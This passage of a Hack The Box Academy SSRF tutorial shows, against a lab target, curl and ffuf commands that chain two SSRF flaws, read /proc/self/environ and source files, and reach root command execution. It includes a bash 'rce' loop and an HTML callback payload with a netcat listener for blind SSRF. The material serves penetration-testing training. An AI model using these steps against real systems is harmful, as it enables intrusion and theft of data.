         <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>  <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span> <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>___/  <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>          <span class="hljs-tag">\<span class="hljs-name">/</span></span>_/    <span class="hljs-tag">\<span class="hljs-name">/</span></span>_/   <span class="hljs-tag">\<span class="hljs-name">/</span></span>___/    <span class="hljs-tag">\<span class="hljs-name">/</span></span>_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:PORT
 :: Wordlist         : PORT: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 30
________________________________________________

80                      [Status: 200, Size: 153, Words: 11, Lines: 8]
5000                    [Status: 200, Size: 64, Words: 3, Lines: 1]
:: Progress: [65535/65535] :: Job [1/1] :: 577 req/sec :: Duration: [0:02:00] :: Errors: 0 ::</span>
</code></pre>
<p>We have received a valid response for port <code>5000</code>. Let us check it as follows.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -i -s "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;/</span>load?q=http:<span class="hljs-comment">//127.0.0.1:5000"</span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-Type: text/html; charset=utf<span class="hljs-number">-8</span>
Content-Length: <span class="hljs-number">64</span>
Server: Werkzeug/<span class="hljs-number">2.0</span><span class="hljs-number">.2</span> Python/<span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
<span class="hljs-built_in">Date</span>: Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">47</span>:<span class="hljs-number">16</span> GMT

&lt;html&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hey!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>Some internal app!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
</code></pre>
<p>Up to this point, we have learned how to reach internal applications and use different schemas to load local files through SSRF. Armed with this knowledge, let us try attacking the <code>internal.app.local</code> web application, again through SSRF. Our ultimate goal is to achieve remote code execution on an internal host.</p>
<p>First, we issue a simple cURL request to the internal application we discovered previously. Remember the information we uncovered that both applications load resources in the same way (via the <code>q</code> parameter).</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -i -s <span class="hljs-string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=index.html"</span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-Type: text/html; charset=utf<span class="hljs-number">-8</span>
Content-Length: <span class="hljs-number">83</span>
<span class="hljs-symbol">Server:</span> Werkzeug/<span class="hljs-number">2.0</span><span class="hljs-number">.2</span> Python/<span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
<span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">13</span>:<span class="hljs-number">51</span>:<span class="hljs-number">15</span> GMT

<span class="hljs-params">&lt;html&gt;</span>
<span class="hljs-params">&lt;body&gt;</span>
<span class="hljs-params">&lt;h1&gt;</span>Internal Web Application<span class="hljs-params">&lt;/h1&gt;</span>
<span class="hljs-params">&lt;a&gt;</span>Hello World!<span class="hljs-params">&lt;/a&gt;</span>
<span class="hljs-params">&lt;/body&gt;</span>
<span class="hljs-params">&lt;/html&gt;</span>
</code></pre>
<p>Now, let us discover any web applications listening in localhost. Let us try to issue a request to a random port to identify how responses from closed ports look.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -i -s "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;/</span>load?q=http:<span class="hljs-comment">//internal.app.local/load?q=http://127.0.0.1:1"</span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-Type: text/html; charset=utf<span class="hljs-number">-8</span>
Content-Length: <span class="hljs-number">97</span>
Server: Werkzeug/<span class="hljs-number">2.0</span><span class="hljs-number">.2</span> Python/<span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
<span class="hljs-built_in">Date</span>: Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">14</span>:<span class="hljs-number">52</span>:<span class="hljs-number">32</span> GMT

&lt;html&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Resource: http127.0.0.1:1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>unknown url type: http127.0.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
</code></pre>
<p>We have received an <code>unknown url type</code> error message. It seems the web application is removing <code>://</code> from our request. Let&#39;s try to overcome this situation by modifying the URL.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -i -s "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;/</span>load?q=http:<span class="hljs-comment">//internal.app.local/load?q=http::////127.0.0.1:1"</span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-<span class="hljs-string">Type:</span> text/html; charset=utf<span class="hljs-number">-8</span>
Content-<span class="hljs-string">Length:</span> <span class="hljs-number">99</span>
<span class="hljs-string">Server:</span> Werkzeug<span class="hljs-regexp">/2.0.2 Python/</span><span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
<span class="hljs-string">Date:</span> Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">14</span>:<span class="hljs-number">55</span>:<span class="hljs-number">10</span> GMT

&lt;html&gt;&lt;body&gt;&lt;h1&gt;<span class="hljs-string">Resource:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//127.0.0.1:1&lt;/h1&gt;&lt;a&gt;[Errno 111] Connection refused&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span>
</code></pre>
<p>In this case, the web application returns some HTML rendered content containing the resource we are trying to fetch. This response will affect our internal service discovery if we use the size of the response as a filter as it will change depending on the port. Fortunately for us, ffuf supports regular expressions for filtering. We can use this ffuf feature to use the error number for filtering responses, as follows.</p>
<p><strong>Port Fuzzing</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-formula">$ ffuf -w ./ports.txt:PORT -u "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'


        /'___<span class="hljs-tag">\<span class="hljs-name"> </span></span> /'___<span class="hljs-tag">\<span class="hljs-name"> </span></span>          /'___<span class="hljs-tag">\<span class="hljs-name">
</span></span>       /<span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>_/ /<span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>_/  __  __  /<span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>_/
       <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>,__<span class="hljs-tag">\<span class="hljs-name">\</span></span> <span class="hljs-tag">\<span class="hljs-name"> </span></span>,__<span class="hljs-tag">\<span class="hljs-name">/</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">/</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>,__<span class="hljs-tag">\<span class="hljs-name">
</span></span>        <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>/ <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>/<span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>/
         <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>  <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span> <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>___/  <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>          <span class="hljs-tag">\<span class="hljs-name">/</span></span>_/    <span class="hljs-tag">\<span class="hljs-name">/</span></span>_/   <span class="hljs-tag">\<span class="hljs-name">/</span></span>___/    <span class="hljs-tag">\<span class="hljs-name">/</span></span>_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT
 :: Wordlist         : PORT: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Errno[[:blank:]]111
________________________________________________

80                      [Status: 200, Size: 153, Words: 5, Lines: 6]
5000                    [Status: 200, Size: 123, Words: 3, Lines: 5]
:: Progress: [65535/65535] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:06] :: Errors: 0 ::</span>
</code></pre>
<p>We have found another application listening on port 5000. In this case, the application responds with a list of files.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"

HTTP/1.0<span class="hljs-number"> 200 </span>OK
Content-Type: text/html; charset=utf-8
Content-Length: 385
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue,<span class="hljs-number"> 19 </span>Oct<span class="hljs-number"> 2021 </span>20:30:07 GMT

&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:5000/&lt;/h1&gt;&lt;a&gt;total 24K
drwxr-xr-x<span class="hljs-number"> 1 </span>root root 4.0K Oct<span class="hljs-number"> 19 </span>20:29 .
drwxr-xr-x<span class="hljs-number"> 1 </span>root root 4.0K Oct<span class="hljs-number"> 19 </span>20:29 ..
-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 84 </span>Oct<span class="hljs-number"> 19 </span>16:32 index.html
-rw-r--r--<span class="hljs-number"> 1 </span>root root 1.2K Oct<span class="hljs-number"> 19 </span>16:32 internal.py
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 691 </span>Oct<span class="hljs-number"> 19 </span>20:29 internal_local.py
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 69 </span>Oct<span class="hljs-number"> 19 </span>16:32 start.sh
 &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>Let us make a quick recap of what we have achieved:</p>
<ul>
<li>Issue requests on behalf of ubuntu-web to internal.app.local</li>
<li>Reach a web application listening on port 5000 inside internal.app.local chaining two SSRF vulnerabilities</li>
<li>Disclose a list of files via the internal application</li>
</ul>
<p>Let us now uncover the source code of the web applications listening on <code>internal.app.local</code> to see how we can achieve remote code execution.</p>
<p>Let us issue a request to disclose <code>/proc/self/environ</code> file, where the current path should be present under the <code>PWD</code> environment variable.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -i -s "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;/load</span>?q=<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/internal.app.local/load</span>?q=<span class="hljs-symbol">file:</span>:<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/self</span><span class="hljs-regexp">/environ" -o -

HTTP/</span><span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-<span class="hljs-symbol">Type:</span> text/html; charset=utf-<span class="hljs-number">8</span>
Content-<span class="hljs-symbol">Length:</span> <span class="hljs-number">584</span>
<span class="hljs-symbol">Server:</span> Werkzeug/<span class="hljs-number">2.0</span>.<span class="hljs-number">2</span> Python/<span class="hljs-number">3.8</span>.<span class="hljs-number">12</span>
<span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">16</span>:<span class="hljs-number">52</span>:<span class="hljs-number">20</span> GMT

&lt;html&gt;&lt;body&gt;&lt;h1&gt;<span class="hljs-symbol">Resource:</span> <span class="hljs-symbol">file:</span>/<span class="hljs-regexp">//proc</span><span class="hljs-regexp">/self/environ</span>&lt;<span class="hljs-regexp">/h1&gt;&lt;a&gt;HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/app</span>PORT=<span class="hljs-number">80</span>PYTHON_SETUPTOOLS_VERSION=<span class="hljs-number">57.5</span>.<span class="hljs-number">0</span>HOME=<span class="hljs-regexp">/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https:/</span><span class="hljs-regexp">/github.com/pypa</span><span class="hljs-regexp">/get-pip/raw</span><span class="hljs-regexp">/d781367b97acf0ece7e9e304bf281e99b618bf10/public</span><span class="hljs-regexp">/get-pip.pyPATH=/usr</span><span class="hljs-regexp">/local/bin</span>:<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin:/usr</span><span class="hljs-regexp">/local/bin</span>:<span class="hljs-regexp">/usr/sbin</span>:<span class="hljs-regexp">/usr/bin</span>:<span class="hljs-regexp">/sbin:/bin</span>_=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/bin/python</span>3&lt;<span class="hljs-regexp">/a&gt;&lt;/body</span>&gt;&lt;<span class="hljs-regexp">/html&gt;</span>
</code></pre>
<p>Now we know that the current path is <code>/app</code>, and we have a list of interesting files. Let&#39;s disclose the <code>internal_local.py</code> file as follows.</p>
<p><strong>Retrieving a local file through the target application - File Schema</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -i -s <span class="hljs-string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"</span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-Type: <span class="hljs-keyword">text</span>/html; charset=utf<span class="hljs-number">-8</span>
Content-Length: <span class="hljs-number">771</span>
Server: Werkzeug/<span class="hljs-number">2.0</span><span class="hljs-number">.2</span> Python/<span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
Date: Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">40</span>:<span class="hljs-number">28</span> GMT

&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: <span class="hljs-built_in">file</span>:<span class="hljs-comment">///app/internal_local.py&lt;/h1&gt;&lt;a&gt;import os</span>
<span class="hljs-built_in">from</span> flask import *
import urllib
import subprocess

basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)

def run_command(<span class="hljs-keyword">command</span>):
    p = subprocess.Popen(<span class="hljs-keyword">command</span>, <span class="hljs-title">shell</span>=<span class="hljs-title">True</span>, <span class="hljs-title">stdout</span>=<span class="hljs-title">subprocess</span>.<span class="hljs-title">PIPE</span>, <span class="hljs-title">stderr</span>=<span class="hljs-title">subprocess</span>.<span class="hljs-title">PIPE</span>)
    <span class="hljs-keyword">stdout</span> = p.<span class="hljs-keyword">stdout</span>.<span class="hljs-built_in">read</span>()
    <span class="hljs-keyword">stderr</span> = p.<span class="hljs-keyword">stderr</span>.<span class="hljs-built_in">read</span>()
    <span class="hljs-built_in">result</span> = <span class="hljs-keyword">stdout</span>.decode() + <span class="hljs-string">" "</span> + <span class="hljs-keyword">stderr</span>.decode()
    <span class="hljs-literal">return</span> <span class="hljs-built_in">result</span>

@app.route(<span class="hljs-string">"/"</span>)
def index():
    <span class="hljs-literal">return</span> run_command(<span class="hljs-string">"ls -lha"</span>)

@app.route(<span class="hljs-string">"/runme"</span>)
def runmewithargs():
    <span class="hljs-keyword">command</span> = <span class="hljs-title">request</span>.<span class="hljs-title">args</span>.<span class="hljs-title">get</span>(<span class="hljs-string">"x"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">command</span> == <span class="hljs-string">""</span>:
        <span class="hljs-literal">return</span> <span class="hljs-string">"Use /runme?x=&lt;CMD&gt;"</span>
    <span class="hljs-literal">return</span> run_command(<span class="hljs-keyword">command</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(host=<span class="hljs-string">"127.0.0.1"</span>, port=<span class="hljs-number">5000</span>)
&lt;/<span class="hljs-keyword">a</span>&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>By studying the source code above, we notice a functionality that allows us to execute commands on the remote host sending a GET request to<code>/runme?x=&lt;CMD&gt;</code>. Let us confirm remote code execution by sending <code>whoami</code> as a command.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -i -s "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;/</span>load?q=http:<span class="hljs-comment">//internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"</span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-Type: text/html; charset=utf<span class="hljs-number">-8</span>
Content-Length: <span class="hljs-number">93</span>
Server: Werkzeug/<span class="hljs-number">2.0</span><span class="hljs-number">.2</span> Python/<span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
<span class="hljs-built_in">Date</span>: Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">48</span>:<span class="hljs-number">32</span> GMT

&lt;html&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Resource: http://127.0.0.1:5000/runme?x=whoami<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>root
 <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
</code></pre>
<p>We can execute commands under the superuser context on the target application. But what happens if we try to submit a command with arguments, such as the below?</p>
<pre><code class="lang-shell-session">
root@htb[/htb]$ curl -i -s "http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"

HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1')
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 586

<span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"Content-Type"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"text/html;charset=utf-8"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error response<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Error response<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Error code: 400<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Message: Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1').<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>To execute commands with arguments or special characters, we need to encode them three times as we pass them through three different web applications.</p>
<p>For doing so, you can use any online URL-encoding service such as <a href="https://www.urlencoder.org/">urlencoder.org</a>. A quick way to achieve this from the terminal also exists. This is to use <code>jq</code>, which supports encoding as follows:</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo apt-get install jq
root@htb[/htb]$ echo <span class="hljs-string">"encode me"</span> | jq -sRr @uri
encode%20me%0A
</code></pre>
<p>We can now create a bash function to automate executing commands on the target application.</p>
<p><strong>Automate executing commands</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">rce</span></span>() {
<span class="hljs-keyword">function</span>&gt; <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>
<span class="hljs-keyword">function</span> <span class="hljs-keyword">while</span>&gt; <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"# "</span>; <span class="hljs-built_in">read</span> cmd
<span class="hljs-keyword">function</span> <span class="hljs-keyword">while</span>&gt; ecmd=$(<span class="hljs-built_in">echo</span> -n <span class="hljs-variable">$cmd</span> | jq <span class="hljs-_">-s</span>Rr @uri | jq <span class="hljs-_">-s</span>Rr @uri | jq <span class="hljs-_">-s</span>Rr @uri)
<span class="hljs-keyword">function</span> <span class="hljs-keyword">while</span>&gt; curl <span class="hljs-_">-s</span> -o - <span class="hljs-string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=<span class="hljs-variable">${ecmd}</span>"</span>
<span class="hljs-keyword">function</span> <span class="hljs-keyword">while</span>&gt; <span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-keyword">function</span> <span class="hljs-keyword">while</span>&gt; <span class="hljs-keyword">done</span>
<span class="hljs-keyword">function</span>&gt; }
</code></pre>
<p>Now we need to call the function and execute commands via:</p>
<pre><code class="lang-shell-session"><span class="hljs-attribute">root</span>@htb[/htb]$ rce
<span class="hljs-comment"># uname -a; hostname; whoami</span>

<span class="hljs-section">&lt;html&gt;</span><span class="hljs-section">&lt;body&gt;</span><span class="hljs-section">&lt;h1&gt;</span><span class="hljs-attribute">Resource</span>: http://127.0.0.1:5000/runme?x=uname<span class="hljs-number">%20</span>-a<span class="hljs-number">%3</span>B<span class="hljs-number">%20</span>hostname<span class="hljs-number">%3</span>B<span class="hljs-number">%20</span>whoami
<span class="hljs-section">&lt;/h1&gt;</span><span class="hljs-section">&lt;a&gt;</span><span class="hljs-attribute">Linux</span> a054d48cc0a4 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 GNU/Linux
<span class="hljs-attribute">a054d48cc0a4</span>
<span class="hljs-attribute">root</span>
 <span class="hljs-section">&lt;/a&gt;</span><span class="hljs-section">&lt;/body&gt;</span><span class="hljs-section">&lt;/html&gt;</span>
</code></pre>
<h2 id="blind-ssrf">Blind SSRF</h2>
<hr>
<p>Server-Side Request Forgery vulnerabilities can be &quot;blind.&quot; In these cases, even though the request is processed, we can&#39;t see the backend server&#39;s response. For this reason, blind SSRF vulnerabilities are more difficult to detect and exploit.</p>
<p>We can detect blind SSRF vulnerabilities via out-of-band techniques, making the server issue a request to an external service under our control. To detect if a backend service is processing our requests, we can either use a server with a public IP address that we own or services such as:</p>
<ul>
<li><a href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a> (Part of Burp Suite professional. Not Available in the community edition)</li>
<li><a href="http://pingb.in">http://pingb.in</a></li>
</ul>
<p>Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.</p>
<h2 id="blind-ssrf-exploitation-example">Blind SSRF Exploitation Example</h2>
<hr>
<p>Now, let us exploit a blind SSRF vulnerability in a web application that receives an HTML file and returns a PDF document. This web application is the target we can spawn on the exercise at the end of this section.</p>
<p>Navigate to the end of this section and click on <code>Click here to spawn the target system!</code>, then use the provided Pwnbox or a local VM with the supplied VPN key to browse the target application and follow along. The application is listening on port 8080.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind1_.png" alt="image"></p>
<p>If we upload various HTML files and inspect the responses, we will notice that the application returns the same response regardless of the structure and content of the submitted files. In addition, we cannot observe any response related to the processing of the submitted HTML file on the front end. Should we conclude that the application is not vulnerable to SSRF? Of course not! We should be thorough during penetration tests and look for the blind counterparts of different vulnerability classes.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/response_blind1_.png" alt="image"></p>
<p>Let us create an HTML file containing a link to a service under our control to test if the application is vulnerable to a blind SSRF vulnerability. This service can be a web server hosted in a machine we own, Burp Collaborator, a Pingb.in URL etc. Please note that the protocols we can use when utilizing out-of-band techniques include HTTP, DNS, FTP, etc.</p>
<pre><code class="lang-html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>Hello World!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://&lt;SERVICE IP&gt;:PORT/x?=viaimgtag"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>For the sake of simplicity, the service we will use to test for a blind SSRF vulnerability will be a simple Netcat listener running in Pwnbox or a local VM and listening on port 9090. If you are using a local VM, remember to use the supplied VPN key. So, on the above HTML file, <code>SERVICE IP</code> should be the <code>VPN/TUN IP</code> of Pwnbox or your local VM, and <code>PORT</code> should be <code>9090</code>.</p>
<p><strong>Netcat Listener</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nc -nlvp <span class="hljs-number">9090</span>

Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-number">9090</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_server__.png" alt="image"></p>
